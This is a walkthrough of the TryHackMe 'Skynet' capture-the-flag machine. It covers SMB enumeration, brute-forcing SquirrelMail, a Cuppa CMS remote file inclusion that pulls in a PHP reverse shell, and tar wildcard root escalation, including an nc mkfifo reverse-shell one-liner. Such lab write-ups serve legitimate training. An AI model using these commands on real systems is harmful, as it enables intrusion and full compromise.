| [![Skynet](/_static/images/skynet.png)](https://tryhackme.com/room/skynet) |
|:--:|
| [https://tryhackme.com/room/skynet](https://tryhackme.com/room/skynet) |

# Skynet

A vulnerable Terminator themed Linux machine.

## Scanning

First run a simple port scan (without Ping)

	# nmap -Pn -p- <IP address target machine> -oN portscan

portscan:

```text
# Nmap 7.92 scan initiated Sat Oct  1 01:57:07 2022 as: nmap -Pn -p- -oN portscan 10.10.62.253
Nmap scan report for 10.10.62.253
Host is up (0.052s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

# Nmap done at Sat Oct  1 01:58:03 2022 -- 1 IP address (1 host up) scanned in 56.21 seconds
```

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p22,80 <IP address target machine> -oN servicescan

servicescan:

```text
# Nmap 7.92 scan initiated Sat Oct  1 02:02:38 2022 as: nmap -Pn -T4 -A -p22,80,110,139,143,445 -oN servicescan 10.10.62.253
Nmap scan report for 10.10.62.253
Host is up (0.042s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL CAPA AUTH-RESP-CODE RESP-CODES TOP UIDL PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LITERAL+ more have post-login Pre-login IMAP4rev1 IDLE ENABLE listed LOGINDISABLEDA0001 ID OK SASL-IR LOGIN-REFERRALS capabilities
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Linux 3.12 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2022-10-01T01:02:53
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-09-30T20:02:53-05:00

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   53.21 ms 10.9.0.1
2   53.38 ms 10.10.62.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  1 02:02:55 2022 -- 1 IP address (1 host up) scanned in 17.78 seconds
```

## Investigating SMB

    # smbclient -L 10.10.62.253
    Password for [WORKGROUP\root]:
    
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
    Reconnecting with SMB1 for workgroup listing.
    
        Server               Comment
        ---------            -------
    
        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET

One of the shares is called milesdyson, that could be the administrator's name. And, there is an anonymous share. 

Connect to the anonymous share:

    # smbclient //10.10.62.253/anonymous
    Password for [WORKGROUP\root]:
    Try "help" to get a list of possible commands.
    smb: \>  

Explore the anonymous share, and `get` what seems of interest for furthering access:

    smb: \> dir
      .                                   D        0  Thu Nov 26 16:04:00 2020
      ..                                  D        0  Tue Sep 17 08:20:17 2019
      attention.txt                       N      163  Wed Sep 18 04:04:59 2019
      logs                                D        0  Wed Sep 18 05:42:16 2019
    
            9204224 blocks of size 1024. 5831512 blocks available
    smb: \> get attention.txt
    getting file \attention.txt of size 163 as attention.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
    smb: \> cd logs
    smb: \logs\> dir
      .                                   D        0  Wed Sep 18 05:42:16 2019
      ..                                  D        0  Thu Nov 26 16:04:00 2020
      log2.txt                            N        0  Wed Sep 18 05:42:13 2019
      log1.txt                            N      471  Wed Sep 18 05:41:59 2019
      log3.txt                            N        0  Wed Sep 18 05:42:16 2019
    
            9204224 blocks of size 1024. 5831512 blocks available
    smb: \logs\> mget *
    Get file log2.txt? y
    getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.6 KiloBytes/sec)
    Get file log1.txt? y
    getting file \logs\log1.txt of size 471 as log1.txt (2.8 KiloBytes/sec) (average 1.4 KiloBytes/sec)
    Get file log3.txt? y
    getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.1 KiloBytes/sec)
    smb: \logs\> exit

Content of `attention.txt`:

    # cat attention.txt 
    A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
    -Miles Dyson

A message that would be sent by a system's administrator, by "Miles Dyson".

Content of logs:

    #  cat log*           
    cyborg007haloterminator
    terminator22596
    terminator219
    terminator20
    terminator1989
    terminator1988
    terminator168
    terminator16
    terminator143
    terminator13
    terminator123!@#
    terminator1056
    terminator101
    terminator10
    terminator02
    terminator00
    roboterminator
    pongterminator
    manasturcaluterminator
    exterminator95
    exterminator200
    dterminator
    djxterminator
    dexterminator
    determinator
    cyborg007haloterminator
    avsterminator
    alonsoterminator
    Walterminator
    79terminator6
    1996terminator

Seems to be some kind of password list???

Find hidden files or directories using gobuster:

    # gobuster dir -u http://10.10.62.253/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.62.253/
    [+] Method:                  GET
    [+] Threads:                 50
    [+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Extensions:              php,html,txt
    [+] Timeout:                 10s
    ===============================================================
    2022/10/01 02:21:00 Starting gobuster in directory enumeration mode
    ===============================================================
    /index.html           (Status: 200) [Size: 523]
    /admin                (Status: 301) [Size: 312] [--> http://10.10.62.253/admin/]
    /css                  (Status: 301) [Size: 310] [--> http://10.10.62.253/css/]  
    /js                   (Status: 301) [Size: 309] [--> http://10.10.62.253/js/]   
    /config               (Status: 301) [Size: 313] [--> http://10.10.62.253/config/]
    /ai                   (Status: 301) [Size: 309] [--> http://10.10.62.253/ai/]    
    /squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.62.253/squirrelmail/]
    /server-status        (Status: 403) [Size: 277]                                        
                                                                                           
    ===============================================================
    2022/10/01 02:33:34 Finished
    ===============================================================

A SquirrelMail entry. 

## Brute-forcing SquirrelMail

Using that loglist of possible passwords, try a 
[brute-forcing attack in Burpsuite](https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types) 
intruder with a possible username of `milesdyson`:

| ![Intercept](/_static/images/Screenshot from 2022-10-01 15-47-12.png) |
|:--:|
| Intercept a login attempt, send to Intruder |

| ![Set payload](/_static/images/Screenshot from 2022-10-01 15-55-42.png) |
|:--:|
| Set position "admin" and set payload with list found in logs |

| ![Sniper](/_static/images/Screenshot from 2022-10-01 16-06-09.png) |
|:--:|
| Run sniper attack |

Authenticate into SquirrelMail using the password found by Burp Suite intruder.

There are three emails, one of which has a subject of "Samba Password reset", with a rather 
interesting content:

| ![Email1](/_static/images/Screenshot from 2022-10-01 16-11-16.png) |
|:--:|
| Samba password reset |

## SMB again

Use the password found to log in to the `milesdyson` share found earlier:

    # smbclient -U milesdyson //10.10.56.232/milesdyson  
    Password for [WORKGROUP\milesdyson]:
    Try "help" to get a list of possible commands.
    smb: \> 

Explore:

    smb: \> dir
      .                                   D        0  Tue Sep 17 10:05:47 2019
      ..                                  D        0  Wed Sep 18 04:51:03 2019
      Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019
      Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
      Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019
      notes                               D        0  Tue Sep 17 10:18:40 2019
      Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019
      Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019
    
            9204224 blocks of size 1024. 5831448 blocks available
    smb: \> cd notes
    smb: \notes\> dir
      .                                   D        0  Tue Sep 17 10:18:40 2019
      ..                                  D        0  Tue Sep 17 10:05:47 2019
      3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019
      4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019
      2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019
      0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019
      1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019
      important.txt                       N      117  Tue Sep 17 10:18:39 2019
      6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019
      3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019
      2.01 Overview.md                    N     1165  Tue Sep 17 10:01:29 2019
      3.02 Planning.md                    N    71657  Tue Sep 17 10:01:29 2019
      1.04 Probability.md                 N    62712  Tue Sep 17 10:01:29 2019
      2.06 Natural Language Processing.md      N    82633  Tue Sep 17 10:01:29 2019
      2.00 Machine Learning.md            N       26  Tue Sep 17 10:01:29 2019
      1.03 Calculus.md                    N    40779  Tue Sep 17 10:01:29 2019
      3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 10:01:29 2019
      1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 10:01:29 2019
      1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 10:01:29 2019
      6.00 Appendices.md                  N       20  Tue Sep 17 10:01:29 2019
      1.01 Functions.md                   N     7627  Tue Sep 17 10:01:29 2019
      2.03 Neural Nets.md                 N   144726  Tue Sep 17 10:01:29 2019
      2.04 Model Selection.md             N    33383  Tue Sep 17 10:01:29 2019
      2.02 Supervised Learning.md         N    94287  Tue Sep 17 10:01:29 2019
      4.00 Simulation.md                  N       20  Tue Sep 17 10:01:29 2019
      3.05 In Practice.md                 N     1123  Tue Sep 17 10:01:29 2019
      1.07 Graphs.md                      N     5110  Tue Sep 17 10:01:29 2019
      2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 10:01:29 2019
      2.05 Bayesian Learning.md           N    39443  Tue Sep 17 10:01:29 2019
      5.03 Anonymization.md               N     2516  Tue Sep 17 10:01:29 2019
      5.01 Process.md                     N     5788  Tue Sep 17 10:01:29 2019
      1.09 Optimization.md                N    25823  Tue Sep 17 10:01:29 2019
      1.05 Statistics.md                  N    64291  Tue Sep 17 10:01:29 2019
      5.02 Visualization.md               N      940  Tue Sep 17 10:01:29 2019
      5.00 In Practice.md                 N       21  Tue Sep 17 10:01:29 2019
      4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 10:01:29 2019
      1.10 Algorithms.md                  N    28790  Tue Sep 17 10:01:29 2019
      3.04 Filtering.md                   N    13360  Tue Sep 17 10:01:29 2019
      1.00 Foundations.md                 N       22  Tue Sep 17 10:01:29 2019
    
            9204224 blocks of size 1024. 5831448 blocks available
    smb: \notes\>

Get that `important.txt`:

    smb: \notes\> get important.txt
    getting file \notes\important.txt of size 117 as important.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)

And read it on local machine:

```text
# cat important.txt
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

A CMS in beta!

| ![CMS](/_static/images/Screenshot from 2022-10-01 16-25-26.png) |
|:--:|
| http://10.10.56.232/45kra24zxs28v3yd/ |

Find its directories with gobuster:

    # gobuster dir -u http://10.10.56.232/45kra24zxs28v3yd/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.56.232/45kra24zxs28v3yd/
    [+] Method:                  GET
    [+] Threads:                 50
    [+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Extensions:              php,html,txt
    [+] Timeout:                 10s
    ===============================================================
    2022/10/01 16:30:01 Starting gobuster in directory enumeration mode
    ===============================================================
    /index.html           (Status: 200) [Size: 418]
    /administrator        (Status: 301) [Size: 337] [--> http://10.10.56.232/45kra24zxs28v3yd/administrator/]
                                                                                                             
    ===============================================================
    2022/10/01 16:42:24 Finished
    ===============================================================

| ![administrator page](/_static/images/Screenshot from 2022-10-01 16-32-18.png) |
|:--:|
| http://10.10.56.232/45kra24zxs28v3yd/administrator/ |

    # searchsploit cuppa cms   
    ---------------------------------------------- ---------------------------------
     Exploit Title                                |  Path
    ---------------------------------------------- ---------------------------------
    Cuppa CMS - '/alertConfigField.php' Local/Rem | php/webapps/25971.txt
    ---------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results
                                                                                
    # searchsploit -m php/webapps/25971.txt
      Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
          URL: https://www.exploit-db.com/exploits/25971
         Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
    File Type: C++ source, ASCII text, with very long lines (876)
    
    Copied to: /home/nina/Downloads/skynet/25971.txt

Confirm the [25971 exploit](https://www.exploit-db.com/exploits/25971)

| ![Confirmed](/_static/images/Screenshot from 2022-10-01 16-52-02.png) |
|:--:|
| http://10.10.56.232/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?<br>urlConfig=../../../../../../../../../etc/passwd |

It is vulnerable to Remote File Inclusion. 

## Exploit Remote File Inclusion

Use a reverse shell.

Start a listener:

    # nc -nlvp 1234
    Ncat: Version 7.92 ( https://nmap.org/ncat )
    Ncat: Listening on :::1234
    Ncat: Listening on 0.0.0.0:1234

[Download a PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell) and edit it to use your local machine IP. 
 
Make it available via a python web server: 

    python3 -m http.server 8000
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    10.10.56.232 - - [01/Oct/2022 17:59:43] "GET /php-reverse-shell.php HTTP/1.0" 200 -
    10.10.56.232 - - [01/Oct/2022 18:04:11] "GET /php-reverse-shell.php HTTP/1.0" 200 -

And open `http://10.10.56.232/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.1.53:8000/php-reverse-shell.php` 
in your browser.

And connection:

    # nc -nlvp 1234
    Ncat: Version 7.92 ( https://nmap.org/ncat )
    Ncat: Listening on :::1234
    Ncat: Listening on 0.0.0.0:1234
    Ncat: Connection from 10.10.56.232.
    Ncat: Connection from 10.10.56.232:46822.
    Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
     12:04:11 up  2:20,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $

## Privilege escalation

A better shell:

    $ python -c 'import pty; pty.spawn("/bin/bash")'

Explore:

    $ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.
    
    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
    
    # m h dom mon dow user	command
    */1 *	* * *   root	/home/milesdyson/backups/backup.sh
    17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
    25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #

The `backup.sh` script in `/home/milesdyson/backups` uses the `tar` command-line tool to archive the contents of 
the web application stored in `/var/www/html` and place the backups in the backup folder. The script is executed 
by root every minute.

Acoording to [GTFOBins tar](https://gtfobins.github.io/gtfobins/tar/), tar can be exploited when running as 
root (sudo):

    tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Tar has an argument called `–checkpoint`, which displays a "progress" message every time n number of files have 
been archived. This can be used in concatenation with the `–checkpoint-action` flag, which executes an action, 
in the form of a binary or script, whenever a checkpoint is reached.

The wildcard used in the script will execute a given command against all files and folders in the `/var/www/html` 
directory, and this can be exploited by adding a `–checkpoint=1` file (to enable the checkpoint function) and a 
`–checkpoint-action=exec=/tmp/shell.sh` file (to specify the action to perform) which will be effectively treated 
as arguments when tar comes across them.

Create a `bash` script which will create SUID binary of bash, naming it `shell.sh`:

```text
#!/bin/bash
cp /bin/bash /tmp/shell && chmod+s /tmp/shell
```

In `tmp`, execute the commands to create the two files (arguments) for `tar`:

    touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
    touch "/var/www/html/--checkpoint=1"

After `cron` has run and has created the shell SUID copy of bash, execute it with the `-p` flag:

    $ /tmp/shell -p
    # whoami
    root

Or create a shell with the infamous one-liner, and set up a listener on port 7777:

```text
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attck machine> 7777 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
